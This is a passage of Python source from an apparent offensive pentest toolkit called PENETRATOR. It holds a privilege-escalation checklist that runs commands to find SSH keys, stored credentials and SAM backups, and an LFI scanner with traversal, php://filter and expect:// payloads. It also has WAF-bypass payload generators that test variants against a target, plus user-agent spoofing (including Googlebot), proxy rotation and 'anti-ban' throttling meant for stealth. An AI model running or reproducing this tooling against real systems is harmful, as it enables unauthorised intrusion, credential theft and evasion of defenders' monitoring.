# ---------------------------------------------------------------------------
def domain_reputation(target: str, log: Logger) -> dict:
    """Aggregate reputation data from multiple sources."""
    import requests
    log(f"[*] Domain/IP reputation check: {target}", "cyan")
    results: dict = {"target": target, "sources": {}}
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    # AbuseIPDB (no key = limited)
    try:
        resp = sess.get(f"https://api.abuseipdb.com/api/v2/check",
                        params={"ipAddress": target},
                        headers={"Key": "", "Accept": "application/json"},
                        timeout=10)
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            score = data.get("abuseConfidenceScore", 0)
            results["sources"]["abuseipdb"] = {"score": score}
            tag = "err" if score > 50 else ("warn" if score > 0 else "ok")
            log(f"  AbuseIPDB: confidence score {score}%", tag)
    except requests.RequestException:
        log("  AbuseIPDB: not reachable", "muted")

    # VirusTotal (no key = domain info only)
    try:
        resp = sess.get(f"https://www.virustotal.com/api/v3/domains/{target}",
                        timeout=10)
        if resp.status_code == 200:
            log(f"  VirusTotal: domain info available", "info")
            results["sources"]["virustotal"] = {"available": True}
        else:
            log(f"  VirusTotal: API key required for full results", "muted")
    except requests.RequestException:
        pass

    # Shodan InternetDB (free, no key)
    try:
        resp = sess.get(f"https://internetdb.shodan.io/{target}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            ports = data.get("ports", [])
            vulns = data.get("vulns", [])
            hostnames = data.get("hostnames", [])
            results["sources"]["shodan"] = {"ports": ports, "vulns": vulns,
                                            "hostnames": hostnames}
            log(f"  Shodan: {len(ports)} port(s), {len(vulns)} vuln(s)", "info")
            if vulns:
                log(f"  [!] Known vulns: {', '.join(vulns[:5])}", "err")
            if ports:
                log(f"  Ports: {', '.join(map(str, ports[:20]))}", "info")
    except requests.RequestException:
        log("  Shodan InternetDB: not reachable", "muted")

    # ThreatCrowd
    try:
        resp = sess.get(f"https://www.threatcrowd.org/searchApi/v2/domain/report/",
                        params={"domain": target}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            votes = data.get("votes", 0)
            results["sources"]["threatcrowd"] = {"votes": votes}
            tag = "err" if votes < 0 else "ok"
            log(f"  ThreatCrowd: votes={votes}", tag)
    except requests.RequestException:
        pass

    return results


# ---------------------------------------------------------------------------
# 28. Reverse Shell Generator — ALREADY EXISTS (REVERSE_SHELL_TEMPLATES)
# ---------------------------------------------------------------------------
# (No new function needed — templates are at line ~168)


# ---------------------------------------------------------------------------
# 29. Privilege Escalation Checklist
# ---------------------------------------------------------------------------
PRIVESC_CHECKS_LINUX = [
    ("SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
    ("World-writable files", "find / -perm -o+w -type f 2>/dev/null | head -20"),
    ("Sudo rights", "sudo -l 2>/dev/null"),
    ("Cron jobs", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null"),
    ("Kernel version", "uname -a"),
    ("/etc/passwd writable?", "ls -la /etc/passwd"),
    ("Docker group", "id | grep docker"),
    ("Capabilities", "getcap -r / 2>/dev/null | head -20"),
    ("SSH keys", "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null"),
    ("Config files with passwords", "grep -rl 'password' /etc/ 2>/dev/null | head -10"),
]

PRIVESC_CHECKS_WINDOWS = [
    ("Current privileges", "whoami /priv"),
    ("User info", "whoami /all"),
    ("Unquoted service paths", 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"'),
    ("Scheduled tasks", "schtasks /query /fo LIST /v | findstr /i \"Task To Run\""),
    ("AlwaysInstallElevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"),
    ("Stored credentials", "cmdkey /list"),
    ("Writable service dirs", "icacls \"C:\\Program Files\\*\" 2>nul | findstr /i \"(F)\" | findstr /i \"BUILTIN\\Users\""),
    ("AutoLogon creds", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"),
    ("SAM/SYSTEM backup", "dir /s /b C:\\Windows\\repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul"),
    ("Network config", "ipconfig /all"),
]


def privesc_checklist(platform: str, log: Logger) -> dict:
    """Run privilege escalation enumeration commands."""
    import subprocess

    is_windows = platform.lower().startswith("win")
    checks = PRIVESC_CHECKS_WINDOWS if is_windows else PRIVESC_CHECKS_LINUX
    log(f"[*] Privilege escalation checklist ({'Windows' if is_windows else 'Linux'})", "cyan")
    results: dict = {"platform": platform, "checks": []}

    for name, cmd in checks:
        if _should_stop():
            break
        log(f"\n  ─── {name} ───", "cyan")
        try:
            if is_windows:
                proc = subprocess.run(cmd, shell=True, capture_output=True,
                                      text=True, timeout=15)
            else:
                proc = subprocess.run(cmd, shell=True, capture_output=True,
                                      text=True, timeout=15)
            output = proc.stdout.strip()
            if output:
                for line in output.splitlines()[:15]:
                    log(f"  {line}", "info")
                if len(output.splitlines()) > 15:
                    log(f"  ... +{len(output.splitlines()) - 15} more lines", "muted")
                results["checks"].append({"name": name, "output": output[:2000],
                                          "status": "data"})
            else:
                log("  (no output)", "muted")
                results["checks"].append({"name": name, "output": "",
                                          "status": "empty"})
        except subprocess.TimeoutExpired:
            log(f"  (timed out)", "muted")
            results["checks"].append({"name": name, "status": "timeout"})
        except OSError as exc:
            log(f"  {exc}", "muted")
            results["checks"].append({"name": name, "status": "error",
                                      "error": str(exc)})

    return results


# ---------------------------------------------------------------------------
# 30. Local File Inclusion (LFI) Scanner
# ---------------------------------------------------------------------------
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\....\\\\windows\\win.ini",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "/etc/passwd%00",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
]

LFI_INDICATORS = [
    "root:", "[extensions]", "for 16-bit app support",
    "daemon:", "www-data", "bin/bash", "Windows",
    "PD9waH",  # base64 encoded PHP
]


def lfi_scan(url: str, param: str, log: Logger) -> list[dict]:
    """Test URL parameters for Local File Inclusion."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))

    if param and param not in params:
        params[param] = ""

    target_param = param or next(iter(params), None)
    if not target_param:
        log("[-] No parameter to test", "err")
        return []

    log(f"[*] LFI scan on {url} — parameter: {target_param}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for payload in LFI_PAYLOADS:
        if _should_stop():
            break
        mut = dict(params)
        mut[target_param] = payload
        test_url = urlunparse(parsed._replace(query=urlencode(mut, safe="")))
        try:
            resp = sess.get(test_url, timeout=10)
        except requests.RequestException:
            continue

        body = resp.text[:5000]
        hits = [ind for ind in LFI_INDICATORS if ind in body]
        if hits:
            log(f"[+] {payload[:50]} → VULNERABLE ({', '.join(hits)})", "err")
            findings.append({"payload": payload, "status": resp.status_code,
                             "indicators": hits, "preview": body[:200]})
        else:
            log(f"  {payload[:50]} → no indicators", "muted")

    log(f"[*] {len(findings)} LFI indicator(s)", "warn" if findings else "ok")
    return findings


# ===========================================================================
# PHASE 10 — Automation, Stealth, Integrations, Defense, Compliance
# ===========================================================================


# ---------------------------------------------------------------------------
# 1. Attack Chain Runner
# ---------------------------------------------------------------------------
def attack_chain(target: str, chain: list[str], log: Logger) -> dict:
    """Run a sequence of tools automatically on a target.
    chain items: 'port_scan', 'banner', 'tls', 'headers', 'buster', 'waf', 'cors'
    """
    log(f"[*] Attack chain on {target}: {' → '.join(chain)}", "cyan")
    results: dict = {"target": target, "chain": chain, "outputs": {}}
    session_set("last_target", target)

    for step in chain:
        if _should_stop():
            log("[!] Chain aborted by user", "warn")
            break
        log(f"\n{'='*60}", "muted")
        log(f"[CHAIN] Step: {step}", "cyan")
        log(f"{'='*60}", "muted")

        try:
            if step == "port_scan":
                results["outputs"]["port_scan"] = scan_ports(target, 1, 1024, 200, 0.5, log)
            elif step == "banner":
                results["outputs"]["banner"] = scan_with_banners(target, 1, 1024, 100, 0.6, log)
            elif step == "tls":
                results["outputs"]["tls"] = tls_scan(target, 443, log)
            elif step == "headers":
                url = f"http://{target}"
                results["outputs"]["headers"] = check_security_headers(url, log)
            elif step == "buster":
                url = f"http://{target}"
                results["outputs"]["buster"] = buster(url, DEFAULT_WEB_PATHS, 50, log)
            elif step == "waf":
                url = f"http://{target}"
                results["outputs"]["waf"] = waf_detect(url, log)
            elif step == "cors":
                url = f"http://{target}"
                results["outputs"]["cors"] = cors_test(url, log)
            elif step == "subdomain":
                results["outputs"]["subdomain"] = find_subdomains(target, 50, log)
            elif step == "takeover":
                results["outputs"]["takeover"] = check_subdomain_takeover(target, log)
            elif step == "git_exposure":
                url = f"http://{target}"
                results["outputs"]["git"] = git_exposure_check(url, log)
            elif step == "swagger":
                url = f"http://{target}"
                results["outputs"]["swagger"] = swagger_discovery(url, log)
            else:
                log(f"  Unknown step: {step}", "warn")
        except Exception as exc:
            log(f"  [-] Step {step} failed: {exc}", "err")
            results["outputs"][step] = {"error": str(exc)}

    log(f"\n[*] Chain complete: {len(results['outputs'])} step(s) executed", "cyan")
    return results


# ---------------------------------------------------------------------------
# 2. Auto-Correlator (Risk Scorer)
# ---------------------------------------------------------------------------
def auto_correlate(log: Logger) -> dict:
    """Analyze all session data and produce a risk score."""
    log("[*] Auto-correlating session findings...", "cyan")
    score = 0
    findings: list[str] = []

    # Check open ports
    open_ports = session_get("last_open_ports", [])
    if open_ports:
        high_risk_ports = [p for p in open_ports if p in (21, 23, 445, 3389, 6379, 27017)]
        if high_risk_ports:
            score += 30
            findings.append(f"High-risk ports open: {high_risk_ports}")
        if len(open_ports) > 20:
            score += 10
            findings.append(f"Large attack surface: {len(open_ports)} open ports")

    # Check subdomains
    subs = session_get("last_subdomains", [])
    if len(subs) > 50:
        score += 10
        findings.append(f"Large subdomain footprint: {len(subs)}")

    # Check buster results
    paths = session_get("last_buster_paths", [])
    sensitive = [p for p in paths if any(s in str(p).lower()
                 for s in (".git", ".env", "admin", "backup", "config"))]
    if sensitive:
        score += 25
        findings.append(f"Sensitive paths exposed: {sensitive[:5]}")

    # Check last target
    target = session_get("last_target")
    if target:
        log(f"  Target: {target}", "info")

    # Grade
    if score >= 70:
        grade = "CRITICAL"
    elif score >= 50:
        grade = "HIGH"
    elif score >= 30:
        grade = "MEDIUM"
    elif score >= 10:
        grade = "LOW"
    else:
        grade = "INFO"

    log(f"\n  {'─'*40}", "muted")
    log(f"  Risk Score: {score}/100", "err" if score >= 50 else "warn" if score >= 30 else "ok")
    log(f"  Grade: {grade}", "err" if score >= 50 else "warn" if score >= 30 else "ok")
    for f in findings:
        log(f"  • {f}", "info")
    if not findings:
        log("  No significant findings in session memory", "ok")

    return {"score": score, "grade": grade, "findings": findings}


# ---------------------------------------------------------------------------
# 3. Scheduled Scan Diff
# ---------------------------------------------------------------------------
def scan_diff(current: dict, previous: dict, log: Logger) -> dict:
    """Compare two scan snapshots and highlight changes."""
    log("[*] Comparing scan results...", "cyan")
    diff: dict = {"new": [], "removed": [], "changed": []}

    curr_ports = set(current.get("ports", []))
    prev_ports = set(previous.get("ports", []))

    new_ports = curr_ports - prev_ports
    removed_ports = prev_ports - curr_ports

    if new_ports:
        diff["new"] = list(new_ports)
        log(f"[+] NEW ports: {sorted(new_ports)}", "err")
    if removed_ports:
        diff["removed"] = list(removed_ports)
        log(f"[-] CLOSED ports: {sorted(removed_ports)}", "ok")
    if not new_ports and not removed_ports:
        log("[=] No port changes detected", "info")

    # Compare subdomains
    curr_subs = set(current.get("subdomains", []))
    prev_subs = set(previous.get("subdomains", []))
    new_subs = curr_subs - prev_subs
    if new_subs:
        log(f"[+] NEW subdomains: {sorted(new_subs)[:10]}", "warn")
        diff["new_subdomains"] = list(new_subs)

    return diff


# ---------------------------------------------------------------------------
# 4. Smart Payload Generator (WAF-aware)
# ---------------------------------------------------------------------------
WAF_BYPASS_ENCODINGS = {
    "cloudflare": [
        lambda p: p.replace("<", "%EF%BC%9C").replace(">", "%EF%BC%9E"),
        lambda p: p.replace("'", "%EF%BC%87"),
        lambda p: "/**/".join(p.split(" ")),
    ],
    "modsecurity": [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
        lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    ],
    "aws": [
        lambda p: p.replace("<script>", "<scr\x00ipt>"),
        lambda p: urllib.parse.quote(p, safe=""),
    ],
    "generic": [
        lambda p: urllib.parse.quote(p, safe=""),
        lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
        lambda p: base64.b64encode(p.encode()).decode(),
        lambda p: "".join(f"&#x{ord(c):x};" for c in p),
    ],
}


def smart_payload_gen(payload: str, waf_type: str, log: Logger) -> list[str]:
    """Generate WAF-bypass variants of a payload based on detected WAF type."""
    waf_key = waf_type.lower()
    log(f"[*] Generating bypass payloads for WAF: {waf_type}", "cyan")
    log(f"  Original: {payload}", "info")

    encoders = WAF_BYPASS_ENCODINGS.get(waf_key, WAF_BYPASS_ENCODINGS["generic"])
    variants: list[str] = [payload]

    for encoder in encoders:
        try:
            variant = encoder(payload)
            if variant != payload and variant not in variants:
                variants.append(variant)
                log(f"  → {variant[:100]}", "ok")
        except Exception:
            pass

    # Always add generic encodings too
    if waf_key != "generic":
        for encoder in WAF_BYPASS_ENCODINGS["generic"]:
            try:
                variant = encoder(payload)
                if variant not in variants:
                    variants.append(variant)
                    log(f"  → {variant[:100]}", "info")
            except Exception:
                pass

    log(f"[*] {len(variants)} variant(s) generated", "cyan")
    return variants


# ---------------------------------------------------------------------------
# 5. Executive Report Generator
# ---------------------------------------------------------------------------
def executive_report(target: str, log: Logger) -> str:
    """Generate an executive summary from session memory."""
    log(f"[*] Generating executive report for: {target}", "cyan")

    open_ports = session_get("last_open_ports", [])
    subs = session_get("last_subdomains", [])
    paths = session_get("last_buster_paths", [])

    # Build report text
    lines: list[str] = []
    lines.append(f"# Penetration Test Report — {target}")
    lines.append(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")
    lines.append("## Executive Summary")
    lines.append(f"Target: {target}")
    lines.append(f"Open ports: {len(open_ports)}")
    lines.append(f"Subdomains discovered: {len(subs)}")
    lines.append(f"Sensitive paths found: {len(paths)}")
    lines.append("")

    # Risk assessment
    risk_score = 0
    if any(p in open_ports for p in (21, 23, 445, 3389)):
        risk_score += 30
    if paths:
        risk_score += 20
    if len(open_ports) > 15:
        risk_score += 15

    grade = "CRITICAL" if risk_score >= 60 else "HIGH" if risk_score >= 40 else "MEDIUM" if risk_score >= 20 else "LOW"
    lines.append(f"## Risk Assessment")
    lines.append(f"Score: {risk_score}/100 ({grade})")
    lines.append("")

    if open_ports:
        lines.append("## Open Ports")
        for p in sorted(open_ports)[:30]:
            svc = COMMON_SERVICES.get(p, "unknown")
            lines.append(f"- {p}/{svc}")
        lines.append("")

    if subs:
        lines.append("## Subdomains")
        for s in sorted(subs)[:20]:
            lines.append(f"- {s}")
        lines.append("")

    lines.append("## Recommendations")
    if any(p in open_ports for p in (21, 23)):
        lines.append("- CRITICAL: Close FTP/Telnet ports — use SFTP/SSH instead")
    if 3389 in open_ports:
        lines.append("- HIGH: RDP exposed — restrict with VPN/firewall rules")
    if paths:
        lines.append("- HIGH: Remove sensitive files from web root (.git, .env, backups)")
    lines.append("- Implement rate limiting on all public endpoints")
    lines.append("- Enable security headers (HSTS, CSP, X-Frame-Options)")
    lines.append("")
    lines.append("---")
    lines.append("Generated by PENETRATOR v1.5.0")

    report = "\n".join(lines)
    for line in lines:
        log(line, "info")
    return report


# ---------------------------------------------------------------------------
# 6. Proxy Configuration
# ---------------------------------------------------------------------------
_proxy_config: dict[str, str] = {}


def set_proxy(proxy_url: str, log: Logger) -> dict:
    """Configure a global proxy for all requests."""
    global _proxy_config
    if not proxy_url:
        _proxy_config = {}
        log("[+] Proxy disabled", "ok")
        return {}
    _proxy_config = {"http": proxy_url, "https": proxy_url}
    log(f"[+] Proxy set: {proxy_url}", "ok")
    # Test connectivity
    import requests
    try:
        resp = requests.get("https://httpbin.org/ip", proxies=_proxy_config, timeout=10)
        data = resp.json()
        log(f"  External IP via proxy: {data.get('origin', '?')}", "info")
    except requests.RequestException as exc:
        log(f"[!] Proxy test failed: {exc}", "warn")
    return _proxy_config


def get_proxy() -> dict:
    return _proxy_config


# ---------------------------------------------------------------------------
# 7. User-Agent Rotation
# ---------------------------------------------------------------------------
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.7.1",
    "python-requests/2.32.0",
    "Wget/1.21.4",
    "PostmanRuntime/7.38.0",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
]


def random_ua() -> str:
    """Return a random User-Agent from the pool."""
    return secrets.choice(UA_POOL)


def ua_rotation_demo(url: str, count: int, log: Logger) -> list[dict]:
    """Send requests with rotating User-Agents to demonstrate stealth."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    count = max(1, min(50, count))
    log(f"[*] UA rotation: {count} requests to {url}", "cyan")
    results: list[dict] = []

    for i in range(count):
        if _should_stop():
            break
        ua = random_ua()
        try:
            resp = requests.get(url, timeout=10, headers={"User-Agent": ua},
                                proxies=get_proxy())
            log(f"  [{resp.status_code}] UA: {ua[:50]}...", "info")
            results.append({"ua": ua, "status": resp.status_code})
        except requests.RequestException as exc:
            log(f"  [-] {exc}", "muted")
    return results


# ---------------------------------------------------------------------------
# 8. Request Throttling
# ---------------------------------------------------------------------------
def throttled_requests(url: str, count: int, min_delay: float,
                       max_delay: float, log: Logger) -> list[dict]:
    """Send requests with random delay between them (anti-ban)."""
    import requests
    import random
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    count = max(1, min(200, count))
    min_delay = max(0.1, min_delay)
    max_delay = max(min_delay, max_delay)
    log(f"[*] Throttled scan: {count} requests, delay {min_delay}-{max_delay}s", "cyan")
    results: list[dict] = []

    for i in range(count):
        if _should_stop():
            break
        ua = random_ua()
        try:
            resp = requests.get(url, timeout=10, headers={"User-Agent": ua},
                                proxies=get_proxy())
            results.append({"idx": i, "status": resp.status_code, "ua": ua})
            log(f"  [{i+1}/{count}] HTTP {resp.status_code}", "info")
        except requests.RequestException as exc:
            log(f"  [{i+1}/{count}] Error: {exc}", "muted")
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)

    log(f"[*] {len(results)} requests completed", "cyan")
    return results


# ---------------------------------------------------------------------------
# 9. IP Rotation via Proxy List
# ---------------------------------------------------------------------------
def proxy_rotation_test(url: str, proxy_list: list[str], log: Logger) -> list[dict]:
    """Test a URL through multiple proxies to verify IP rotation."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] Proxy rotation test: {len(proxy_list)} proxies", "cyan")
    results: list[dict] = []

    for proxy in proxy_list:
        if _should_stop():
            break
        proxies = {"http": proxy, "https": proxy}
        try:
            resp = requests.get(url, proxies=proxies, timeout=15,
                                headers={"User-Agent": random_ua()})
            log(f"[+] {proxy} → HTTP {resp.status_code} ({len(resp.content)} bytes)", "ok")
            results.append({"proxy": proxy, "status": resp.status_code, "working": True})
        except requests.RequestException as exc:
            log(f"[-] {proxy} → FAILED ({exc})", "muted")
            results.append({"proxy": proxy, "status": 0, "working": False})

    working = sum(1 for r in results if r["working"])
    log(f"[*] {working}/{len(results)} proxies working", "cyan")
    return results


# ---------------------------------------------------------------------------
# 10. WAF Bypass Payload Tester
# ---------------------------------------------------------------------------
def waf_bypass_test(url: str, payload: str, waf_type: str, log: Logger) -> list[dict]:
    """Generate WAF-bypass variants and test them against the target."""
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    variants = smart_payload_gen(payload, waf_type, log)
    log(f"\n[*] Testing {len(variants)} bypass variants against {url}", "cyan")

    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    target_param = next(iter(params), "q")
    results: list[dict] = []

    for variant in variants:
        if _should_stop():
            break
        mut = dict(params)
        mut[target_param] = variant
        test_url = urlunparse(parsed._replace(query=urlencode(mut, safe="")))
        try:
            resp = requests.get(test_url, timeout=10,
                                headers={"User-Agent": random_ua()},
                                proxies=get_proxy())
            blocked = resp.status_code in (403, 406, 429, 503)
            tag = "err" if not blocked else "muted"
            log(f"  HTTP {resp.status_code} {'BLOCKED' if blocked else 'PASSED!'} ← {variant[:60]}", tag)
            results.append({"variant": variant, "status": resp.status_code,
                            "blocked": blocked})
        except requests.RequestException:
            pass

    passed = sum(1 for r in results if not r["blocked"])
    log(f"[*] {passed}/{len(results)} variants bypassed the WAF", "warn" if passed else "ok")
    return results


# ---------------------------------------------------------------------------
# 11. Nmap XML Import
# ---------------------------------------------------------------------------
def nmap_import(xml_path: str, log: Logger) -> dict:
    """Parse an Nmap XML output file and load results into session."""
    import xml.etree.ElementTree as ET
    log(f"[*] Importing Nmap XML: {xml_path}", "cyan")
    results: dict = {"hosts": [], "total_ports": 0}

    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except Exception as exc:
        log(f"[-] Parse error: {exc}", "err")
        return results

    all_ports: list[int] = []
    for host in root.findall(".//host"):
        addr_el = host.find("address")
        addr = addr_el.get("addr", "") if addr_el is not None else ""
        host_data: dict = {"address": addr, "ports": []}

        for port in host.findall(".//port"):
            state = port.find("state")
            if state is not None and state.get("state") == "open":
                portid = int(port.get("portid", 0))
                protocol = port.get("protocol", "tcp")
                service_el = port.find("service")
                service = service_el.get("name", "") if service_el is not None else ""
                host_data["ports"].append({"port": portid, "proto": protocol,
                                           "service": service})
                all_ports.append(portid)
                log(f"  {addr}:{portid}/{protocol} ({service})", "info")

        if host_data["ports"]:
            results["hosts"].append(host_data)

    # Store in session
    session_set("last_open_ports", sorted(set(all_ports)))
    if results["hosts"]:
        session_set("last_target", results["hosts"][0]["address"])
    results["total_ports"] = len(all_ports)
    log(f"[+] Imported {len(results['hosts'])} host(s), {len(all_ports)} open port(s)", "ok")
    return results


# ---------------------------------------------------------------------------
# 12. Nuclei Template Runner
# ---------------------------------------------------------------------------
def nuclei_run(target: str, templates: str, log: Logger) -> list[dict]:
    """Run nuclei templates against a target (requires nuclei installed)."""
    import shutil
    import subprocess

    if not shutil.which("nuclei"):
        log("[-] nuclei not installed. Download from https://github.com/projectdiscovery/nuclei", "err")
        return []

    cmd = ["nuclei", "-u", target, "-silent", "-jsonl"]
    if templates:
        cmd.extend(["-t", templates])
    log(f"[*] Running: {' '.join(cmd)}", "cyan")

    findings: list[dict] = []
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, encoding="utf-8", errors="ignore")
        assert proc.stdout is not None
        for line in proc.stdout:
            if _should_stop():
                proc.terminate()
                break
            line = line.strip()
            if line:
                try:
                    import json
                    finding = json.loads(line)
                    severity = finding.get("info", {}).get("severity", "info")
                    name = finding.get("info", {}).get("name", "?")
                    matched = finding.get("matched-at", "")
                    tag = "err" if severity in ("critical", "high") else "warn" if severity == "medium" else "info"
                    log(f"[{severity.upper()}] {name} → {matched}", tag)
                    findings.append(finding)
                except (ValueError, TypeError):
                    log(f"  {line}", "info")
        proc.wait()
    except OSError as exc:
        log(f"[-] {exc}", "err")

    log(f"[*] {len(findings)} finding(s) from nuclei", "cyan")
    return findings


# ---------------------------------------------------------------------------
# 13. Burp Suite XML Export
# ---------------------------------------------------------------------------
def burp_export(findings: list[dict], output_path: str, log: Logger) -> str:
    """Export findings in Burp Suite-compatible XML format."""
    log(f"[*] Exporting {len(findings)} findings to Burp XML: {output_path}", "cyan")
    import xml.etree.ElementTree as ET

    root = ET.Element("issues")
    root.set("burpVersion", "2024.0")
    root.set("exportTime", time.strftime("%Y-%m-%dT%H:%M:%S"))

    for finding in findings:
        issue = ET.SubElement(root, "issue")
        ET.SubElement(issue, "serialNumber").text = str(hash(str(finding)) % 10**8)
        ET.SubElement(issue, "type").text = str(finding.get("type", "0"))
        ET.SubElement(issue, "name").text = finding.get("name", "Finding")
        ET.SubElement(issue, "host").text = finding.get("host", "")
        ET.SubElement(issue, "path").text = finding.get("path", "/")
        ET.SubElement(issue, "severity").text = finding.get("severity", "Information")
        ET.SubElement(issue, "confidence").text = finding.get("confidence", "Tentative")
        ET.SubElement(issue, "issueDetail").text = finding.get("detail", "")

    tree = ET.ElementTree(root)
    ET.indent(tree, space="  ")
    tree.write(output_path, encoding="utf-8", xml_declaration=True)
    log(f"[+] Exported to {output_path}", "ok")
    return output_path


# ---------------------------------------------------------------------------
# 14. Metasploit RPC Interface
# ---------------------------------------------------------------------------
def msf_rpc_check(host: str, port: int, token: str, log: Logger) -> dict:
    """Check Metasploit RPC connectivity and list available modules."""
    import requests
    port = port or 55553
    url = f"https://{host}:{port}/api/"
    log(f"[*] Metasploit RPC check: {url}", "cyan")

    try:
        # Auth check
        resp = requests.post(url, json={"method": "auth.token_list", "token": token},
                             timeout=10, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            if "error" not in data:
                log("[+] Connected to Metasploit RPC!", "ok")

                # List exploit count
                resp2 = requests.post(url, json={"method": "module.exploits", "token": token},
                                      timeout=10, verify=False)
                if resp2.status_code == 200:
                    modules = resp2.json().get("modules", [])
                    log(f"  Available exploits: {len(modules)}", "info")
                    return {"connected": True, "exploits": len(modules)}
            else:
                log(f"[-] Auth failed: {data.get('error_message', '')}", "err")
        else:
            log(f"[-] HTTP {resp.status_code}", "err")
    except requests.RequestException as exc:
        log(f"[-] Connection failed: {exc}", "err")
    return {"connected": False}


# ---------------------------------------------------------------------------
# 15. Shodan API Integration
# ---------------------------------------------------------------------------
def shodan_lookup(target: str, api_key: str, log: Logger) -> dict:
    """Query Shodan API for detailed host information."""
    import requests
    log(f"[*] Shodan lookup: {target}", "cyan")

    if not api_key:
        # Fall back to free InternetDB
        log("  No API key — using free InternetDB", "info")
        try:
            resp = requests.get(f"https://internetdb.shodan.io/{target}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                ports = data.get("ports", [])
                vulns = data.get("vulns", [])
                log(f"  Ports: {ports}", "info")
                if vulns:
                    log(f"  [!] Vulns: {vulns}", "err")
                return data
        except requests.RequestException as exc:
            log(f"[-] {exc}", "err")
        return {}

    # Full Shodan API
    try:
        resp = requests.get(f"https://api.shodan.io/shodan/host/{target}",
                            params={"key": api_key}, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            log(f"  Organization: {data.get('org', '?')}", "info")
            log(f"  OS: {data.get('os', '?')}", "info")
            log(f"  Ports: {data.get('ports', [])}", "info")
            vulns = data.get("vulns", [])
            if vulns:
                log(f"  [!] {len(vulns)} known vulnerability(ies)", "err")
                for v in vulns[:10]:
                    log(f"    • {v}", "err")
            return data
        else:
            log(f"[-] Shodan API error: HTTP {resp.status_code}", "err")
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
    return {}


# ---------------------------------------------------------------------------
# 16. SPF/DKIM/DMARC Checker
# ---------------------------------------------------------------------------
def email_security_check(domain: str, log: Logger) -> dict:
    """Check SPF, DKIM, and DMARC records for a domain."""
    import socket as _socket
    log(f"[*] Email security check: {domain}", "cyan")
    results: dict = {"domain": domain, "spf": None, "dkim": None, "dmarc": None}

    try:
        import dns.resolver
        HAS_DNS = True
    except ImportError:
        HAS_DNS = False
        log("[!] dnspython not installed — using basic checks", "warn")

    # SPF
    try:
        if HAS_DNS:
            answers = dns.resolver.resolve(domain, "TXT")
            for rdata in answers:
                txt = str(rdata).strip('"')
                if "v=spf1" in txt:
                    results["spf"] = txt
                    has_all_fail = "-all" in txt
                    tag = "ok" if has_all_fail else "warn"
                    log(f"  SPF: {txt[:100]}", tag)
                    if not has_all_fail:
                        log("  [!] SPF does not end with -all (permissive)", "warn")
                    break
            if not results["spf"]:
                log("  [!] No SPF record found!", "err")
        else:
            import subprocess
            result = subprocess.run(["nslookup", "-type=TXT", domain],
                                    capture_output=True, text=True, timeout=10)
            if "v=spf1" in result.stdout:
